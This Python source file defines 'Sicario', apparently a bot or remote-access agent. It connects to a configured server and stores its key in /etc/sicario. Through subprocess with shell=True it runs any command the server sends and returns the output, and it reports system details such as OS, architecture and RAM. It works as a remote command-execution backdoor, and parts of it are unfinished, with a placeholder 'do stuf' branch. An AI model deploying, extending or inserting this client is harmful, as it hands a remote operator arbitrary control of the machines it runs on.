from __future__ import division
from psutil import virtual_memory
import socket, subprocess, os, math, platform

class Sicario:
	daemon = False
	host = '127.0.0.1'
	port = 1488
	key = ''
	interval = 60
	socket = False
	listen = True

	def __init__ (self, daemon, config):
		self.daemon = daemon
		self.host = config[0]
		self.port = config[1] 
		if len(config) > 2:
			self.key = config[2]
		if len(config) > 3:
			self.interval = config[3]

		self.start()

	def start (self):
		if not self.host or not self.port:
			return False

		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			self.socket.connect((self.host, int(self.port)))
		except:
			self.socket.close() 
			return False

		if not self.key:
			self.__send('register')
			key = self.__parse_command(self.__receive())[2]
			with open('/etc/sicario/sicario.conf', 'w+') as f:
				f.write('{},{},{},{}'.format(self.host, self.port.strip(), key.strip(), self.interval))
				f.close()
		else:
			self.__send(self.__build_command(['login', self.key]))

		while self.listen:
			self.__listen()

	def stop (self):
		self.socket.close()
		self.daemon.stop()
					
	def __listen (self):
		data = self.__receive()

		if not data: # invalid data or no data. we disconnect 
			self.listen = False
			self.socket.close()
			return False

		command = self.__parse_command(data)

		if command[0] == 'execute':
			self.__send(subprocess.check_output(' '.join(command[1:]), shell=True))
		elif command[0] == 'set':
			if command[1] == 'interval':
				self.daemon.interval = command[2]
				self.__send('ok')
				with open('/etc/sicario/sicario.conf', 'w+') as f:
					f.write('{},{},{},{}'.format(self.host, self.port, self.key, command[2]))
					f.close()
		elif command[0] == 'get':
			if command[1] == 'interval':
				self.__send(self.daemon.interval)
			elif command[1] == 'architecture':
				self.__send(platform.architecture()[0])
			elif command[1] == 'system':
				self.__send(platform.system())
			elif command[1] == 'system_ver':
				self.__send(platform.version())
			elif command[1] == 'ram':
				self.__send(str(virtual_memory().total/1024/1024))



	def __send (self, data):
		if not self.socket:
			return False

		if len(data) > 2042:
			packet_count = int(math.ceil(len(data)/2042))
			for x in range(packet_count):
				self.socket.send('SC{}({})'.format(str(packet_count-x).zfill(2), data[x*2042:(x+1)*2042]))
		else: 
			packet = 'SC00({})'.format(data)
			self.socket.send(packet)

	def __receive (self):
		if not self.socket:
			return False

		data = self.socket.recv(2048)

		if not data:
			return False

		signature = data[:2]
		incoming_packets = data[2:4]
		actual_data = data[5:-1]

		if signature != 'SC':
			return False 

		if incoming_packets == '00':
			return actual_data
		else:
			print('do stuf')

	def __parse_command (self, data):
		return data.split(' ')

	def __build_command (self, args):
		return ' '.join(str(arg) for arg in args)
